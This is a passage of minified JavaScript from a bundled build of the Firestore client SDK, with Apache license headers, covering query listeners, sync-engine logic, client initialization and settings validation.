Gk{constructor(e,t,r){this.query=e,this.aa=t,this.ua=!1,this.ca=null,this.onlineState="Unknown",this.options=r||{}}oa(e){if(!this.options.includeMetadataChanges){const r=[];for(const i of e.docChanges)i.type!==3&&r.push(i);e=new zl(e.query,e.docs,e.oldDocs,r,e.mutatedKeys,e.fromCache,e.syncStateChanged,!0,e.hasCachedResults)}let t=!1;return this.ua?this.la(e)&&(this.aa.next(e),t=!0):this.ha(e,this.onlineState)&&(this.Pa(e),t=!0),this.ca=e,t}onError(e){this.aa.error(e)}sa(e){this.onlineState=e;let t=!1;return this.ca&&!this.ua&&this.ha(this.ca,e)&&(this.Pa(this.ca),t=!0),t}ha(e,t){if(!e.fromCache||!this.ra())return!0;const r=t!=="Offline";return(!this.options.Ta||!r)&&(!e.docs.isEmpty()||e.hasCachedResults||t==="Offline")}la(e){if(e.docChanges.length>0)return!0;const t=this.ca&&this.ca.hasPendingWrites!==e.hasPendingWrites;return!(!e.syncStateChanged&&!t)&&this.options.includeMetadataChanges===!0}Pa(e){e=zl.fromInitialDocuments(e.query,e.docs,e.mutatedKeys,e.fromCache,e.hasCachedResults),this.ua=!0,this.aa.next(e)}ra(){return this.options.source!==by.Cache}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Qk{constructor(e){this.key=e}}class Yk{constructor(e){this.key=e}}class Sz{constructor(e,t){this.query=e,this.fa=t,this.ga=null,this.hasCachedResults=!1,this.current=!1,this.pa=Ye(),this.mutatedKeys=Ye(),this.ya=fk(e),this.wa=new wl(this.ya)}get Sa(){return this.fa}ba(e,t){const r=t?t.Da:new sS,i=t?t.wa:this.wa;let s=t?t.mutatedKeys:this.mutatedKeys,o=i,a=!1;const l=this.query.limitType==="F"&&i.size===this.query.limit?i.last():null,u=this.query.limitType==="L"&&i.size===this.query.limit?i.first():null;if(e.inorderTraversal((h,f)=>{const m=i.get(h),v=Hp(this.query,f)?f:null,x=!!m&&this.mutatedKeys.has(m.key),k=!!v&&(v.hasLocalMutations||this.mutatedKeys.has(v.key)&&v.hasCommittedMutations);let I=!1;m&&v?m.data.isEqual(v.data)?x!==k&&(r.track({type:3,doc:v}),I=!0):this.va(m,v)||(r.track({type:2,doc:v}),I=!0,(l&&this.ya(v,l)>0||u&&this.ya(v,u)<0)&&(a=!0)):!m&&v?(r.track({type:0,doc:v}),I=!0):m&&!v&&(r.track({type:1,doc:m}),I=!0,(l||u)&&(a=!0)),I&&(v?(o=o.add(v),s=k?s.add(h):s.delete(h)):(o=o.delete(h),s=s.delete(h)))}),this.query.limit!==null)for(;o.size>this.query.limit;){const h=this.query.limitType==="F"?o.last():o.first();o=o.delete(h.key),s=s.delete(h.key),r.track({type:1,doc:h})}return{wa:o,Da:r,ls:a,mutatedKeys:s}}va(e,t){return e.hasLocalMutations&&t.hasCommittedMutations&&!t.hasLocalMutations}applyChanges(e,t,r,i){const s=this.wa;this.wa=e.wa,this.mutatedKeys=e.mutatedKeys;const o=e.Da.X_();o.sort((h,f)=>function(v,x){const k=I=>{switch(I){case 0:return 1;case 2:case 3:return 2;case 1:return 0;default:return Me()}};return k(v)-k(x)}(h.type,f.type)||this.ya(h.doc,f.doc)),this.Ca(r),i=i!=null&&i;const a=t&&!i?this.Fa():[],l=this.pa.size===0&&this.current&&!i?1:0,u=l!==this.ga;return this.ga=l,o.length!==0||u?{snapshot:new zl(this.query,e.wa,s,o,e.mutatedKeys,l===0,u,!1,!!r&&r.resumeToken.approximateByteSize()>0),Ma:a}:{Ma:a}}sa(e){return this.current&&e==="Offline"?(this.current=!1,this.applyChanges({wa:this.wa,Da:new sS,mutatedKeys:this.mutatedKeys,ls:!1},!1)):{Ma:[]}}xa(e){return!this.fa.has(e)&&!!this.wa.has(e)&&!this.wa.get(e).hasLocalMutations}Ca(e){e&&(e.addedDocuments.forEach(t=>this.fa=this.fa.add(t)),e.modifiedDocuments.forEach(t=>{}),e.removedDocuments.forEach(t=>this.fa=this.fa.delete(t)),this.current=e.current)}Fa(){if(!this.current)return[];const e=this.pa;this.pa=Ye(),this.wa.forEach(r=>{this.xa(r.key)&&(this.pa=this.pa.add(r.key))});const t=[];return e.forEach(r=>{this.pa.has(r)||t.push(new Yk(r))}),this.pa.forEach(r=>{e.has(r)||t.push(new Qk(r))}),t}Oa(e){this.fa=e.gs,this.pa=Ye();const t=this.ba(e.documents);return this.applyChanges(t,!0)}Na(){return zl.fromInitialDocuments(this.query,this.wa,this.mutatedKeys,this.ga===0,this.hasCachedResults)}}const Wv="SyncEngine";class Tz{constructor(e,t,r){this.query=e,this.targetId=t,this.view=r}}class Az{constructor(e){this.key=e,this.Ba=!1}}class bz{constructor(e,t,r,i,s,o){this.localStore=e,this.remoteStore=t,this.eventManager=r,this.sharedClientState=i,this.currentUser=s,this.maxConcurrentLimboResolutions=o,this.La={},this.ka=new va(a=>hk(a),$p),this.qa=new Map,this.Qa=new Set,this.$a=new Qt(Se.comparator),this.Ua=new Map,this.Ka=new Nv,this.Wa={},this.Ga=new Map,this.za=Fl.Kn(),this.onlineState="Unknown",this.ja=void 0}get isPrimaryClient(){return this.ja===!0}}async function xz(n,e,t=!0){const r=nC(n);let i;const s=r.ka.get(e);return s?(r.sharedClientState.addLocalQueryTarget(s.targetId),i=s.view.Na()):i=await Zk(r,e,t,!0),i}async function kz(n,e){const t=nC(n);await Zk(t,e,!0,!1)}async function Zk(n,e,t,r){const i=await GF(n.localStore,bi(e)),s=i.targetId,o=n.sharedClientState.addLocalQueryTarget(s,t);let a;return r&&(a=await Cz(n,e,s,o==="current",i.resumeToken)),n.isPrimaryClient&&t&&Vk(n.remoteStore,i),a}async function Cz(n,e,t,r,i){n.Ha=(f,m,v)=>async function(k,I,S,b){let E=I.view.ba(S);E.ls&&(E=await XI(k.localStore,I.query,!1).then(({documents:L})=>I.view.ba(L,E)));const U=b&&b.targetChanges.get(I.targetId),H=b&&b.targetMismatches.get(I.targetId)!=null,q=I.view.applyChanges(E,k.isPrimaryClient,U,H);return cS(k,I.targetId,q.Ma),q.snapshot}(n,f,m,v);const s=await XI(n.localStore,e,!0),o=new Sz(e,s.gs),a=o.ba(s.documents),l=gh.createSynthesizedTargetChangeForCurrentChange(t,r&&n.onlineState!=="Offline",i),u=o.applyChanges(a,n.isPrimaryClient,l);cS(n,t,u.Ma);const h=new Tz(e,t,o);return n.ka.set(e,h),n.qa.has(t)?n.qa.get(t).push(e):n.qa.set(t,[e]),u.snapshot}async function Rz(n,e,t){const r=Be(n),i=r.ka.get(e),s=r.qa.get(i.targetId);if(s.length>1)return r.qa.set(i.targetId,s.filter(o=>!$p(o,e))),void r.ka.delete(e);r.isPrimaryClient?(r.sharedClientState.removeLocalQueryTarget(i.targetId),r.sharedClientState.isActiveQueryTarget(i.targetId)||await Ty(r.localStore,i.targetId,!1).then(()=>{r.sharedClientState.clearQueryState(i.targetId),t&&Ov(r.remoteStore,i.targetId),xy(r,i.targetId)}).catch(ic)):(xy(r,i.targetId),await Ty(r.localStore,i.targetId,!0))}async function Mz(n,e){const t=Be(n),r=t.ka.get(e),i=t.qa.get(r.targetId);t.isPrimaryClient&&i.length===1&&(t.sharedClientState.removeLocalQueryTarget(r.targetId),Ov(t.remoteStore,r.targetId))}async function Nz(n,e,t){const r=jz(n);try{const i=await function(o,a){const l=Be(o),u=mn.now(),h=a.reduce((v,x)=>v.add(x.key),Ye());let f,m;return l.persistence.runTransaction("Locally write mutations","readwrite",v=>{let x=ds(),k=Ye();return l.ds.getEntries(v,h).next(I=>{x=I,x.forEach((S,b)=>{b.isValidDocument()||(k=k.add(S))})}).next(()=>l.localDocuments.getOverlayedDocuments(v,x)).next(I=>{f=I;const S=[];for(const b of a){const E=GV(b,f.get(b.key).overlayedDocument);E!=null&&S.push(new Eo(b.key,E,rk(E.value.mapValue),ui.exists(!0)))}return l.mutationQueue.addMutationBatch(v,u,S,a)}).next(I=>{m=I;const S=I.applyToLocalDocumentSet(f,k);return l.documentOverlayCache.saveOverlays(v,I.batchId,S)})}).then(()=>({batchId:m.batchId,changes:pk(f)}))}(r.localStore,e);r.sharedClientState.addPendingMutation(i.batchId),function(o,a,l){let u=o.Wa[o.currentUser.toKey()];u||(u=new Qt($e)),u=u.insert(a,l),o.Wa[o.currentUser.toKey()]=u}(r,i.batchId,t),await yh(r,i.changes),await Zp(r.remoteStore)}catch(i){const s=Fv(i,"Failed to persist write");t.reject(s)}}async function Jk(n,e){const t=Be(n);try{const r=await HF(t.localStore,e);e.targetChanges.forEach((i,s)=>{const o=t.Ua.get(s);o&&(st(i.addedDocuments.size+i.modifiedDocuments.size+i.removedDocuments.size<=1),i.addedDocuments.size>0?o.Ba=!0:i.modifiedDocuments.size>0?st(o.Ba):i.removedDocuments.size>0&&(st(o.Ba),o.Ba=!1))}),await yh(t,r,e)}catch(r){await ic(r)}}function lS(n,e,t){const r=Be(n);if(r.isPrimaryClient&&t===0||!r.isPrimaryClient&&t===1){const i=[];r.ka.forEach((s,o)=>{const a=o.view.sa(e);a.snapshot&&i.push(a.snapshot)}),function(o,a){const l=Be(o);l.onlineState=a;let u=!1;l.queries.forEach((h,f)=>{for(const m of f.ta)m.sa(a)&&(u=!0)}),u&&zv(l)}(r.eventManager,e),i.length&&r.La.p_(i),r.onlineState=e,r.isPrimaryClient&&r.sharedClientState.setOnlineState(e)}}async function Pz(n,e,t){const r=Be(n);r.sharedClientState.updateQueryState(e,"rejected",t);const i=r.Ua.get(e),s=i&&i.key;if(s){let o=new Qt(Se.comparator);o=o.insert(s,Xn.newNoDocument(s,De.min()));const a=Ye().add(s),l=new Gp(De.min(),new Map,new Qt($e),o,a);await Jk(r,l),r.$a=r.$a.remove(s),r.Ua.delete(e),$v(r)}else await Ty(r.localStore,e,!1).then(()=>xy(r,e,t)).catch(ic)}async function Lz(n,e){const t=Be(n),r=e.batch.batchId;try{const i=await $F(t.localStore,e);eC(t,r,null),Xk(t,r),t.sharedClientState.updateMutationState(r,"acknowledged"),await yh(t,i)}catch(i){await ic(i)}}async function Dz(n,e,t){const r=Be(n);try{const i=await function(o,a){const l=Be(o);return l.persistence.runTransaction("Reject batch","readwrite-primary",u=>{let h;return l.mutationQueue.lookupMutationBatch(u,a).next(f=>(st(f!==null),h=f.keys(),l.mutationQueue.removeMutationBatch(u,f))).next(()=>l.mutationQueue.performConsistencyCheck(u)).next(()=>l.documentOverlayCache.removeOverlaysForBatchId(u,h,a)).next(()=>l.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(u,h)).next(()=>l.localDocuments.getDocuments(u,h))})}(r.localStore,e);eC(r,e,t),Xk(r,e),r.sharedClientState.updateMutationState(e,"rejected",t),await yh(r,i)}catch(i){await ic(i)}}function Xk(n,e){(n.Ga.get(e)||[]).forEach(t=>{t.resolve()}),n.Ga.delete(e)}function eC(n,e,t){const r=Be(n);let i=r.Wa[r.currentUser.toKey()];if(i){const s=i.get(e);s&&(t?s.reject(t):s.resolve(),i=i.remove(e)),r.Wa[r.currentUser.toKey()]=i}}function xy(n,e,t=null){n.sharedClientState.removeLocalQueryTarget(e);for(const r of n.qa.get(e))n.ka.delete(r),t&&n.La.Ja(r,t);n.qa.delete(e),n.isPrimaryClient&&n.Ka.br(e).forEach(r=>{n.Ka.containsKey(r)||tC(n,r)})}function tC(n,e){n.Qa.delete(e.path.canonicalString());const t=n.$a.get(e);t!==null&&(Ov(n.remoteStore,t),n.$a=n.$a.remove(e),n.Ua.delete(t),$v(n))}function cS(n,e,t){for(const r of t)r instanceof Qk?(n.Ka.addReference(r.key,e),Oz(n,r)):r instanceof Yk?(me(Wv,"Document no longer in limbo: "+r.key),n.Ka.removeReference(r.key,e),n.Ka.containsKey(r.key)||tC(n,r.key)):Me()}function Oz(n,e){const t=e.key,r=t.path.canonicalString();n.$a.get(t)||n.Qa.has(r)||(me(Wv,"New document in limbo: "+t),n.Qa.add(r),$v(n))}function $v(n){for(;n.Qa.size>0&&n.$a.size<n.maxConcurrentLimboResolutions;){const e=n.Qa.values().next().value;n.Qa.delete(e);const t=new Se(Mt.fromString(e)),r=n.za.next();n.Ua.set(r,new Az(t)),n.$a=n.$a.insert(t,r),Vk(n.remoteStore,new zs(bi(xv(t.path)),r,"TargetPurposeLimboResolution",Fp.ae))}}async function yh(n,e,t){const r=Be(n),i=[],s=[],o=[];r.ka.isEmpty()||(r.ka.forEach((a,l)=>{o.push(r.Ha(l,e,t).then(u=>{var h;if((u||t)&&r.isPrimaryClient){const f=u?!u.fromCache:(h=t==null?void 0:t.targetChanges.get(l.targetId))===null||h===void 0?void 0:h.current;r.sharedClientState.updateQueryState(l.targetId,f?"current":"not-current")}if(u){i.push(u);const f=Lv.Yi(l.targetId,u);s.push(f)}}))}),await Promise.all(o),r.La.p_(i),await async function(l,u){const h=Be(l);try{await h.persistence.runTransaction("notifyLocalViewChanges","readwrite",f=>re.forEach(u,m=>re.forEach(m.Hi,v=>h.persistence.referenceDelegate.addReference(f,m.targetId,v)).next(()=>re.forEach(m.Ji,v=>h.persistence.referenceDelegate.removeReference(f,m.targetId,v)))))}catch(f){if(!sc(f))throw f;me(Dv,"Failed to update sequence numbers: "+f)}for(const f of u){const m=f.targetId;if(!f.fromCache){const v=h.Ts.get(m),x=v.snapshotVersion,k=v.withLastLimboFreeSnapshotVersion(x);h.Ts=h.Ts.insert(m,k)}}}(r.localStore,s))}async function Bz(n,e){const t=Be(n);if(!t.currentUser.isEqual(e)){me(Wv,"User change. New user:",e.toKey());const r=await Ok(t.localStore,e);t.currentUser=e,function(s,o){s.Ga.forEach(a=>{a.forEach(l=>{l.reject(new we(ie.CANCELLED,o))})}),s.Ga.clear()}(t,"'waitForPendingWrites' promise is rejected due to a user change."),t.sharedClientState.handleUserChange(e,r.removedBatchIds,r.addedBatchIds),await yh(t,r.Rs)}}function Uz(n,e){const t=Be(n),r=t.Ua.get(e);if(r&&r.Ba)return Ye().add(r.key);{let i=Ye();const s=t.qa.get(e);if(!s)return i;for(const o of s){const a=t.ka.get(o);i=i.unionWith(a.view.Sa)}return i}}function nC(n){const e=Be(n);return e.remoteStore.remoteSyncer.applyRemoteEvent=Jk.bind(null,e),e.remoteStore.remoteSyncer.getRemoteKeysForTarget=Uz.bind(null,e),e.remoteStore.remoteSyncer.rejectListen=Pz.bind(null,e),e.La.p_=Ez.bind(null,e.eventManager),e.La.Ja=Iz.bind(null,e.eventManager),e}function jz(n){const e=Be(n);return e.remoteStore.remoteSyncer.applySuccessfulWrite=Lz.bind(null,e),e.remoteStore.remoteSyncer.rejectFailedWrite=Dz.bind(null,e),e}class $d{constructor(){this.kind="memory",this.synchronizeTabs=!1}async initialize(e){this.serializer=Qp(e.databaseInfo.databaseId),this.sharedClientState=this.Za(e),this.persistence=this.Xa(e),await this.persistence.start(),this.localStore=this.eu(e),this.gcScheduler=this.tu(e,this.localStore),this.indexBackfillerScheduler=this.nu(e,this.localStore)}tu(e,t){return null}nu(e,t){return null}eu(e){return WF(this.persistence,new VF,e.initialUser,this.serializer)}Xa(e){return new Dk(Pv.ri,this.serializer)}Za(e){return new YF}async terminate(){var e,t;(e=this.gcScheduler)===null||e===void 0||e.stop(),(t=this.indexBackfillerScheduler)===null||t===void 0||t.stop(),this.sharedClientState.shutdown(),await this.persistence.shutdown()}}$d.provider={build:()=>new $d};class Vz extends $d{constructor(e){super(),this.cacheSizeBytes=e}tu(e,t){st(this.persistence.referenceDelegate instanceof zd);const r=this.persistence.referenceDelegate.garbageCollector;return new AF(r,e.asyncQueue,t)}Xa(e){const t=this.cacheSizeBytes!==void 0?fr.withCacheSize(this.cacheSizeBytes):fr.DEFAULT;return new Dk(r=>zd.ri(r,t),this.serializer)}}class ky{async initialize(e,t){this.localStore||(this.localStore=e.localStore,this.sharedClientState=e.sharedClientState,this.datastore=this.createDatastore(t),this.remoteStore=this.createRemoteStore(t),this.eventManager=this.createEventManager(t),this.syncEngine=this.createSyncEngine(t,!e.synchronizeTabs),this.sharedClientState.onlineStateHandler=r=>lS(this.syncEngine,r,1),this.remoteStore.remoteSyncer.handleCredentialChange=Bz.bind(null,this.syncEngine),await wz(this.remoteStore,this.syncEngine.isPrimaryClient))}createEventManager(e){return function(){return new _z}()}createDatastore(e){const t=Qp(e.databaseInfo.databaseId),r=function(s){return new tz(s)}(e.databaseInfo);return function(s,o,a,l){return new sz(s,o,a,l)}(e.authCredentials,e.appCheckCredentials,r,t)}createRemoteStore(e){return function(r,i,s,o,a){return new az(r,i,s,o,a)}(this.localStore,this.datastore,e.asyncQueue,t=>lS(this.syncEngine,t,0),function(){return nS.D()?new nS:new ZF}())}createSyncEngine(e,t){return function(i,s,o,a,l,u,h){const f=new bz(i,s,o,a,l,u);return h&&(f.ja=!0),f}(this.localStore,this.remoteStore,this.eventManager,this.sharedClientState,e.initialUser,e.maxConcurrentLimboResolutions,t)}async terminate(){var e,t;await async function(i){const s=Be(i);me(la,"RemoteStore shutting down."),s.W_.add(5),await mh(s),s.z_.shutdown(),s.j_.set("Unknown")}(this.remoteStore),(e=this.datastore)===null||e===void 0||e.terminate(),(t=this.eventManager)===null||t===void 0||t.terminate()}}ky.provider={build:()=>new ky};/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *//**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class rC{constructor(e){this.observer=e,this.muted=!1}next(e){this.muted||this.observer.next&&this.iu(this.observer.next,e)}error(e){this.muted||(this.observer.error?this.iu(this.observer.error,e):fs("Uncaught Error in snapshot listener:",e.toString()))}su(){this.muted=!0}iu(e,t){setTimeout(()=>{this.muted||e(t)},0)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const po="FirestoreClient";class Fz{constructor(e,t,r,i,s){this.authCredentials=e,this.appCheckCredentials=t,this.asyncQueue=r,this.databaseInfo=i,this.user=Zn.UNAUTHENTICATED,this.clientId=q2.newId(),this.authCredentialListener=()=>Promise.resolve(),this.appCheckCredentialListener=()=>Promise.resolve(),this._uninitializedComponentsProvider=s,this.authCredentials.start(r,async o=>{me(po,"Received user=",o.uid),await this.authCredentialListener(o),this.user=o}),this.appCheckCredentials.start(r,o=>(me(po,"Received new app check token=",o),this.appCheckCredentialListener(o,this.user)))}get configuration(){return{asyncQueue:this.asyncQueue,databaseInfo:this.databaseInfo,clientId:this.clientId,authCredentials:this.authCredentials,appCheckCredentials:this.appCheckCredentials,initialUser:this.user,maxConcurrentLimboResolutions:100}}setCredentialChangeListener(e){this.authCredentialListener=e}setAppCheckTokenChangeListener(e){this.appCheckCredentialListener=e}terminate(){this.asyncQueue.enterRestrictedMode();const e=new ns;return this.asyncQueue.enqueueAndForgetEvenWhileRestricted(async()=>{try{this._onlineComponents&&await this._onlineComponents.terminate(),this._offlineComponents&&await this._offlineComponents.terminate(),this.authCredentials.shutdown(),this.appCheckCredentials.shutdown(),e.resolve()}catch(t){const r=Fv(t,"Failed to shutdown persistence");e.reject(r)}}),e.promise}}async function Cm(n,e){n.asyncQueue.verifyOperationInProgress(),me(po,"Initializing OfflineComponentProvider");const t=n.configuration;await e.initialize(t);let r=t.initialUser;n.setCredentialChangeListener(async i=>{r.isEqual(i)||(await Ok(e.localStore,i),r=i)}),e.persistence.setDatabaseDeletedListener(()=>n.terminate()),n._offlineComponents=e}async function uS(n,e){n.asyncQueue.verifyOperationInProgress();const t=await zz(n);me(po,"Initializing OnlineComponentProvider"),await e.initialize(t,n.configuration),n.setCredentialChangeListener(r=>iS(e.remoteStore,r)),n.setAppCheckTokenChangeListener((r,i)=>iS(e.remoteStore,i)),n._onlineComponents=e}async function zz(n){if(!n._offlineComponents)if(n._uninitializedComponentsProvider){me(po,"Using user provided OfflineComponentProvider");try{await Cm(n,n._uninitializedComponentsProvider._offline)}catch(e){const t=e;if(!function(i){return i.name==="FirebaseError"?i.code===ie.FAILED_PRECONDITION||i.code===ie.UNIMPLEMENTED:!(typeof DOMException<"u"&&i instanceof DOMException)||i.code===22||i.code===20||i.code===11}(t))throw t;Bl("Error using user provided cache. Falling back to memory cache: "+t),await Cm(n,new $d)}}else me(po,"Using default OfflineComponentProvider"),await Cm(n,new Vz(void 0));return n._offlineComponents}async function iC(n){return n._onlineComponents||(n._uninitializedComponentsProvider?(me(po,"Using user provided OnlineComponentProvider"),await uS(n,n._uninitializedComponentsProvider._online)):(me(po,"Using default OnlineComponentProvider"),await uS(n,new ky))),n._onlineComponents}function Wz(n){return iC(n).then(e=>e.syncEngine)}async function sC(n){const e=await iC(n),t=e.eventManager;return t.onListen=xz.bind(null,e.syncEngine),t.onUnlisten=Rz.bind(null,e.syncEngine),t.onFirstRemoteStoreListen=kz.bind(null,e.syncEngine),t.onLastRemoteStoreUnlisten=Mz.bind(null,e.syncEngine),t}function $z(n,e,t={}){const r=new ns;return n.asyncQueue.enqueueAndForget(async()=>function(s,o,a,l,u){const h=new rC({next:m=>{h.su(),o.enqueueAndForget(()=>Kk(s,f));const v=m.docs.has(a);!v&&m.fromCache?u.reject(new we(ie.UNAVAILABLE,"Failed to get document because the client is offline.")):v&&m.fromCache&&l&&l.source==="server"?u.reject(new we(ie.UNAVAILABLE,'Failed to get document from server. (However, this document does exist in the local cache. Run again without setting source to "server" to retrieve the cached document.)')):u.resolve(m)},error:m=>u.reject(m)}),f=new Gk(xv(a.path),h,{includeMetadataChanges:!0,Ta:!0});return qk(s,f)}(await sC(n),n.asyncQueue,e,t,r)),r.promise}function Hz(n,e,t={}){const r=new ns;return n.asyncQueue.enqueueAndForget(async()=>function(s,o,a,l,u){const h=new rC({next:m=>{h.su(),o.enqueueAndForget(()=>Kk(s,f)),m.fromCache&&l.source==="server"?u.reject(new we(ie.UNAVAILABLE,'Failed to get documents from server. (However, these documents may exist in the local cache. Run again without setting source to "server" to retrieve the cached documents.)')):u.resolve(m)},error:m=>u.reject(m)}),f=new Gk(a,h,{includeMetadataChanges:!0,Ta:!0});return qk(s,f)}(await sC(n),n.asyncQueue,e,t,r)),r.promise}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function oC(n){const e={};return n.timeoutSeconds!==void 0&&(e.timeoutSeconds=n.timeoutSeconds),e}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const hS=new Map;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function aC(n,e,t){if(!t)throw new we(ie.INVALID_ARGUMENT,`Function ${n}() cannot be called with an empty ${e}.`)}function qz(n,e,t,r){if(e===!0&&r===!0)throw new we(ie.INVALID_ARGUMENT,`${n} and ${t} cannot be used together.`)}function fS(n){if(!Se.isDocumentKey(n))throw new we(ie.INVALID_ARGUMENT,`Invalid document reference. Document references must have an even number of segments, but ${n} has ${n.length}.`)}function dS(n){if(Se.isDocumentKey(n))throw new we(ie.INVALID_ARGUMENT,`Invalid collection reference. Collection references must have an odd number of segments, but ${n} has ${n.length}.`)}function Jp(n){if(n===void 0)return"undefined";if(n===null)return"null";if(typeof n=="string")return n.length>20&&(n=`${n.substring(0,20)}...`),JSON.stringify(n);if(typeof n=="number"||typeof n=="boolean")return""+n;if(typeof n=="object"){if(n instanceof Array)return"an array";{const e=function(r){return r.constructor?r.constructor.name:null}(n);return e?`a custom ${e} object`:"an object"}}return typeof n=="function"?"a function":Me()}function Ri(n,e){if("_delegate"in n&&(n=n._delegate),!(n instanceof e)){if(e.name===n.constructor.name)throw new we(ie.INVALID_ARGUMENT,"Type does not match the expected instance. Did you pass a reference from a different Firestore SDK?");{const t=Jp(n);throw new we(ie.INVALID_ARGUMENT,`Expected type '${e.name}', but it was: ${t}`)}}return n}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const lC="firestore.googleapis.com",pS=!0;class gS{constructor(e){var t,r;if(e.host===void 0){if(e.ssl!==void 0)throw new we(ie.INVALID_ARGUMENT,"Can't provide ssl option if host option is not set");this.host=lC,this.ssl=pS}else this.host=e.host,this.ssl=(t=e.ssl)!==null&&t!==void 0?t:pS;if(this.credentials=e.credentials,this.ignoreUndefinedProperties=!!e.ignoreUndefinedProperties,this.localCache=e.localCache,e.cacheSizeBytes===void 0)this.cacheSizeBytes=Lk;else{if(e.cacheSizeBytes!==-1&&e.cacheSizeBytes<SF)throw new we(ie.INVALID_ARGUMENT,"cacheSizeBytes must be at least 1048576");this.cacheSizeBytes=e.cacheSizeBytes}qz("experimentalForceLongPolling",e.experimentalForceLongPolling,"experimentalAutoDetectLongPolling",e.experimentalAutoDetectLongPolling),this.experimentalForceLongPolling=!!e.experimentalForceLongPolling,this.experimentalForceLongPolling?this.experimentalAutoDetectLongPolling=!1:e.experimentalAutoDetectLongPolling===void 0?this.experimentalAutoDetectLongPolling=!0:this.experimentalAutoDetectLongPolling=!!e.experimentalAutoDetectLongPolling,this.experimentalLongPollingOptions=oC((r=e.experimentalLongPollingOptions)!==null&&r!==void 0?r:{}),function(s){if(s.timeoutSeconds!==void 0){if(isNaN(s.timeoutSeconds))throw new we(ie.INVALID_ARGUMENT,`invalid long polling timeout: ${s.timeoutSeconds} (must not be NaN)`);if(s.timeoutSeconds<5)throw new we(ie.INVALID_ARGUMENT,`invalid long polling timeout: ${s.timeoutSeconds} (minimum allowed value is 5)`);if(s.timeoutSeconds>30)throw new we(ie.INVALID_ARGUMENT,`invalid long polling timeout: ${s.timeoutSeconds} (maximum allowed value is 30)`)}}(this.experimentalLongPollingOptions),this.useFetchStreams=!!e.useFetchStreams}isEqual(e){return this.host===e.host&&this.ssl===e.ssl&&this.credentials===e.credentials&&this.cacheSizeBytes===e.cacheSizeBytes&&this.experimentalForceLongPolling===e.experimentalForceLongPolling&&this.experimentalAutoDetectLongPolling===e.experimentalAutoDetectLongPolling&&function(r,i){return r.timeoutSeconds===i.timeoutSeconds}(this.experimentalLongPollingOptions,e.experimentalLongPollingOptions)&&this.ignoreUndefinedProperties===e.ignoreUndefinedProperties&&this.useFetchStreams===e.useFetchStreams}}class Xp{constructor(e,t,r,i){this._authCredentials=e,this._appCheckCredentials=t,this._databaseId=r,this._app=i,this.type="firestore-lite",this._persistenceKey="(lite)",this._settings=new gS({}),this._settingsFrozen=!1,this._emulatorOptions={},this._terminateTask="notTerminated"}get app(){if(!this._app)throw new we(ie.FAILED_PRECONDITION,"Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._app}get _initialized(){return this._settingsFrozen}get _terminated(){return this._terminateTask!=="notTerminated"}_setSettings(e){if(this._settingsFrozen)throw new we(ie.FAILED_PRECONDITION,"Firestore has already been started and its settings can no longer be changed. You can only modify settings before calling any other methods on a Firestore object.");this._settings=new 